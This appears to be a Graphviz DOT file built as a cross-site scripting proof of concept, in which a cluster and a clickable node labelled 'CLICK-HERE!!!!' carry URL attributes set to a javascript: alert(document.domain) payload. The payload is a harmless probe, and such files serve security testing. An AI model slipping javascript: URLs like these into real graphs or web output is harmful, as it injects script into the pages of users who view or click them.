digraph mygraph {
  

  subgraph cluster_self_portraits {
    URL="javascript:alert(document.domain);"
    label="XSS vulnerability !!"

    "CLICK-HERE!!!!" [URL="javascript:alert(document.domain);"]
  }
}
